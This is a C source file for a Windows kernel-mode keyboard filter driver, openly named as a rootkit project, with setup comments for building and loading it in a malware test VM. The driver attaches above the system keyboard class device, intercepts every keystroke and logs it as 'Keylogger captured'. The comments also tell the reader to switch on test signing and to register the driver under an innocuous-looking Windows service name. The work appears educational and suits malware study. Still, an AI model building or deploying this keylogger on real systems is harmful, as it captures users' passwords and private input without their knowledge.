// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// Name:                            KernelRootkit007_KeyboardFilter
// IDE:                             Open Visual Studio
// Template:                        Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
// Project:                         Project Name: KMDFDriver_KeyboardFilter -> Solution Name: KernelRootkit007_KeyboardFilter -> Create
// Source File:                     Source Files -> Add -> New Item... -> Driver.c
// Source Code:                     Open Driver.c and copy the corresponding source code
// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
// Locate Driver:                   C:\Users\%USERNAME%\source\repos\KernelRootkit007_KeyboardFilter\x64\Release\KMDFDriver_KeyboardFilter.sys
// Virtual Machine:                 Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
// Move Driver:                     Copy KMDFDriver_KeyboardFilter.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys (VM)
// Enable Test Mode:                Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
// Driver Installation:             Open a CMD window as Administrator -> sc.exe create WindowsKernelKeyboardFilter type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys"
// Registered Driver:               Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelKeyboardFilter
// Service Status:                  Run in CMD as Administrator -> sc.exe query WindowsKernelKeyboardFilter -> driverquery.exe
// Registry Entry:                  Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelKeyboardFilter
// Monitor Messages:                Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
// Start Routine:                   Run in CMD as Administrator -> sc.exe start WindowsKernelKeyboardFilter
// Clean:                           Run in CMD as Administrator -> sc.exe stop WindowsKernelKeyboardFilter
// Remove:                          Run in CMD as Administrator -> sc.exe delete WindowsKernelKeyboardFilter



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



/**
	@brief		This structure is used as an extension to the device object for keyboard-related operations.


	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param		LowerKeyboardDevice		Pointer to the lower-level keyboard device object.
**/
typedef struct {
	PDEVICE_OBJECT	LowerKeyboardDevice;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;
// https://doxygen.reactos.org/da/db3/struct____DEVICE__EXTENSION____.html



/**
	@brief		This structure represents information related to keyboard input events.


	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param		UnitId				Specifies the unit number of a keyboard device. A keyboard device name has the format \Device\KeyboardPortN, where the suffix N is the unit number of the device. For example, a device, whose name is \Device\KeyboardPort0, has a unit number of zero, and a device, whose name is \Device\KeyboardPort1, has a unit number of one.

	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param		MakeCode			Specifies the scan code associated with a key press.

	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param		Flags				Specifies a bitwise OR of one or more of the following flags that indicate whether a key was pressed or released, and other miscellaneous information.

	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
	@param		Reserved			Reserved for operating system use.

	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#ULONG
	@param		ExtraInformation	Specifies device-specific information associated with a keyboard event.
**/
typedef struct _KEYBOARD_INPUT_DATA {
	USHORT		UnitId;
	USHORT		MakeCode;
	USHORT		Flags;
	USHORT		Reserved;
	ULONG		ExtraInformation;
} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;
// https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-keyboard_input_data



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Pointer to device object for keyboard driver
PDEVICE_OBJECT Global_MyKeyboardDevice = NULL;
// Counter to track the number of pending keyboard input events
ULONG Global_PendingKey = 0;
// Global table for mapping keyboard scan codes (0–255) to their ASCII-equivalent key labels
static const char* Global_ScanCodeToAscii[256] = {
	"", "Esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace", "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "Enter", "Ctrl", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "Shift", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "Shift", "*", "Alt", "Space", "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NumLock", "ScrollLock", "Home", "Up", "PgUp", "-", "Left", "Center", "Right", "+", "End", "Down", "PgDn", "Insert", "Delete"
};



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief		Unloads a Windows kernel-mode driver.
	@details	This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload


	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
**/
VOID
DriverUnload(
	_In_		PDRIVER_OBJECT			pDriverObject
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Print a debug message to indicate the driver is being unloaded
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Unload routine invoked");
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Unloading");


	// ---------------------------------------------------------------------------------------------------------------------
	// Set interval to wait for pending key events
	LARGE_INTEGER interval = { 0 };
	interval.QuadPart = -10 * 1000 * 1000;


	// ---------------------------------------------------------------------------------------------------------------------
	// Detach keyboard device
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Detach keyboard device");

	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodetachdevice
	// The IoDetachDevice routine releases an attachment between the caller's device object and a lower driver's device object.
	IoDetachDevice(((PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension)->LowerKeyboardDevice);


	// ---------------------------------------------------------------------------------------------------------------------
	// Wait for pending key events to complete
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Wait for pending key events to complete");

	// Loop
	while (Global_PendingKey)
	{
		// The KeDelayExecutionThread routine puts the current thread into an alertable or nonalertable wait state for a specified interval.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kedelayexecutionthread
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Remove device object from the system
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Remove device object from the system");

	// The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
	IoDeleteDevice(Global_MyKeyboardDevice);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverUnload) - Bye");
}



/**
	@brief		A passthrough function for handling IRPs (I/O Request Packets).


	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.

	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverPassthrough(
	_In_		PDEVICE_OBJECT			pDeviceObject,
	_In_		PIRP					pIrp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverPassthrough) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy current IRP stack location to next stack location
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverPassthrough) - Copy current IRP stack location to next stack location");

	// The IoCopyCurrentIrpStackLocationToNext routine copies the IRP stack parameters from the current I/O stack location to the stack location of the next-lower driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocopycurrentirpstacklocationtonext
	IoCopyCurrentIrpStackLocationToNext(pIrp);


	// ---------------------------------------------------------------------------------------------------------------------
	// Forward IRP to lower-level keyboard device driver
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverPassthrough) - Forward IRP to lower-level keyboard device driver");

	// The IoCallDriver routine, wraps IofCallDriver that sends an IRP to the driver associated with a specified device object.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocalldriver
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKeyboardDevice, pIrp);
}



/**
	@brief		Callback function invoked upon completion of a read operation.


	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.

	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]	pIrp					Pointer to an IRP (I/O request packet) for the read operation.

	@see		PVOID					https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#PVOID
	@param[in]	pcontext				User-defined context parameter.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverCompletionRoutine(
	_In_		PDEVICE_OBJECT			pDeviceObject,
	_In_		PIRP					pIrp,
	_In_		PVOID					pcontext
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameters
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pcontext);


	// ---------------------------------------------------------------------------------------------------------------------
	// Pointer to the buffer containing keyboard input data
	// https://learn.microsoft.com/en-us/windows/win32/api/ntddkbd/ns-ntddkbd-keyboard_input_data
	PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate the number of keyboard input data structures in the buffer
	ULONG_PTR structnum = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if read operation was successful
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		// Iterate through keyboard input data
		for (int i = 0; i < structnum; i++)
		{
			// KeyDown event
			if (keys[i].Flags == 0)
			{
				// United States-International Layout Scancodes
				// https://kbdlayout.info/kbdusx/scancodes
				UCHAR scanCode = (UCHAR)(keys[i].MakeCode & 0xFF);
				
				// Print the corresponding character
				if (scanCode < 256)
				{
					DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverCompletionRoutine) - Keylogger captured -> %s\n", Global_ScanCodeToAscii[scanCode]);
				}
				else
				{
					DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverCompletionRoutine) - Keylogger captured unknown keycode -> %x\n", scanCode);
				}
			}
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Mark IRP as pending if it was pending
	if (pIrp->PendingReturned) {
		// The IoMarkIrpPending routine marks the specified IRP, indicating that a driver's dispatch routine subsequently returned STATUS_PENDING because further processing is required by other driver routines.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iomarkirppending
		IoMarkIrpPending(pIrp);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Decrement the Global_PendingKey count
	Global_PendingKey--;


	// ---------------------------------------------------------------------------------------------------------------------
	// Return the status of the read operation
	return pIrp->IoStatus.Status;
}



/**
	@brief		Function to read keystrokes from keyboard device.


	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.

	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]	pIrp					Pointer to the I/O request packet (IRP) for reading keystrokes.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverReadKeystrokes(
	_In_		PDEVICE_OBJECT			pDeviceObject,
	_In_		PIRP					pIrp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Copy current IRP stack location to next stack location

	// The IoCopyCurrentIrpStackLocationToNext routine copies the IRP stack parameters from the current I/O stack location to the stack location of the next-lower driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocopycurrentirpstacklocationtonext
	IoCopyCurrentIrpStackLocationToNext(pIrp);


	// ---------------------------------------------------------------------------------------------------------------------
	// Set completion routine for IRP

	// The IoSetCompletionRoutine routine registers an IoCompletion routine, which will be called when the next-lower-level driver has completed the requested operation for the given IRP.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iosetcompletionroutine
	IoSetCompletionRoutine(pIrp, DriverCompletionRoutine, NULL, TRUE, TRUE, TRUE);


	// ---------------------------------------------------------------------------------------------------------------------
	// Increment Global_PendingKey count to track pending read operations
	Global_PendingKey++;


	// ---------------------------------------------------------------------------------------------------------------------
	// Forward IRP to lower-level keyboard device driver

	// The IoCallDriver routine, wraps IofCallDriver that sends an IRP to the driver associated with a specified device object.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocalldriver
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->LowerKeyboardDevice, pIrp);
}



/**
	@brief		Attaches the keyboard device to the driver.


	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.


	@return		A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
DriverAttachKeyboard(
	_In_		PDRIVER_OBJECT			pDriverObject
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;
	UNICODE_STRING targetDevice = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");


	// ---------------------------------------------------------------------------------------------------------------------
	// Create a device object for the keyboard
	// The IoCreateDevice routine creates a device object for use by a driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice
	status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &Global_MyKeyboardDevice);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverAttachKeyboard) - ERROR: Error creating device for keyboard -> status: 0x%08X\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Set DO_BUFFERED_IO flag

	// After attaching a legacy filter device object to a file system or volume, always set or clear the DO_BUFFERED_IO and DO_DIRECT_IO flags as needed so that they match the values of the next-lower device object on the driver stack. For more information about these flags, see Methods for Accessing Data Buffers (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/methods-for-accessing-data-buffers).
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/propagating-the-do-buffered-io-and-do-direct-io-flags
	Global_MyKeyboardDevice->Flags |= DO_BUFFERED_IO;


	// ---------------------------------------------------------------------------------------------------------------------
	// Clear DO_DEVICE_INITIALIZING

	// After attaching a legacy filter device object to a file system or volume, always be sure to clear the DO_DEVICE_INITIALIZING flag on the filter device object. (For more information about this flag, see DEVICE_OBJECT in the Kernel Reference https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object). When the filter device object is created, IoCreateDevice sets the DO_DEVICE_INITIALIZING flag on the device object. After the filter is successfully attached, this flag must be cleared. If this flag isn't cleared, no more filter drivers can attach to the filter chain because the call to IoAttachDeviceToDeviceStackSafe will fail. It isn't necessary to clear the DO_DEVICE_INITIALIZING flag on device objects that are created in DriverEntry, because the I/O Manager automatically clears it. However, your driver should clear this flag on all other device objects that it creates.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/clearing-the-do-device-initializing-flag
	Global_MyKeyboardDevice->Flags &= ~DO_DEVICE_INITIALIZING;


	// ---------------------------------------------------------------------------------------------------------------------
	// Clear device extension

	// The RtlZeroMemory routine fills a block of memory with zeros, given a pointer to the block and the length, in bytes, to be filled.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlzeromemory
	RtlZeroMemory(Global_MyKeyboardDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));


	// ---------------------------------------------------------------------------------------------------------------------
	// Attach keyboard device to driver

	// The IoAttachDevice routine attaches the caller's device object to a named target device object, so that I/O requests bound for the target device are routed first to the caller.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioattachdevice
	status = IoAttachDevice(Global_MyKeyboardDevice, &targetDevice, &((PDEVICE_EXTENSION)Global_MyKeyboardDevice->DeviceExtension)->LowerKeyboardDevice);
	if (!NT_SUCCESS(status))
	{
		// Cleanup and delete device object if attachment fails
		// The IoDeleteDevice routine removes a device object from the system, for example, when the underlying device is removed from the system.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice
		IoDeleteDevice(Global_MyKeyboardDevice);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Operation was completed successfully
	return STATUS_SUCCESS;
}



/**
	@brief		Entry point for a Windows kernel-mode driver.
	@details	This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers


	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.

	@see		PUNICODE_STRING			https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
	@param[in]	pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.


	@return		A NTSTATUS value indicating success or an error code if initialization fails.
**/
NTSTATUS
DriverEntry(
	_In_		PDRIVER_OBJECT			pDriverObject,
	_In_		PUNICODE_STRING			pRegistryPath
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Print a debug message to indicate DriverEntry (main) function has been invoked
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - DriverEntry routine invoked");
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Loading");


	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter. We're not using the registry path, so we need to mark it as unreferenced.
	UNREFERENCED_PARAMETER(pRegistryPath);


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;


	// ---------------------------------------------------------------------------------------------------------------------
	// Set DriverUnload routine
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Set DriverUnload routine");

	// The Unload routine performs any operations that are necessary before the system unloads the driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
	pDriverObject->DriverUnload = DriverUnload;


	// ---------------------------------------------------------------------------------------------------------------------
	// Set MajorFunction for different IRP types
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Set MajorFunction for different IRP types");

	// Each driver-specific I/O stack location (IO_STACK_LOCATION) for every IRP contains a major function code (IRP_MJ_XXX), which tells the driver what operation it or the underlying device driver should carry out to satisfy the I/O request. Each kernel-mode driver must provide dispatch routines for the major function codes that it must support (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-major-function-codes).
	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		pDriverObject->MajorFunction[i] = DriverPassthrough;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Read Keystrokes
	//https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-read
	pDriverObject->MajorFunction[IRP_MJ_READ] = DriverReadKeystrokes;


	// ---------------------------------------------------------------------------------------------------------------------
	// Attach keyboard
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Attach keyboard\n");

	status = DriverAttachKeyboard(pDriverObject);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - ERROR: Error attaching keyboard. Status: 0x%08X\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	DbgPrint("Benthic Zone KeyboardFilter -> KMDFDriverKeyboardFilter [Driver.c] (DriverEntry) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Driver initialization was completed successfully
	return STATUS_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------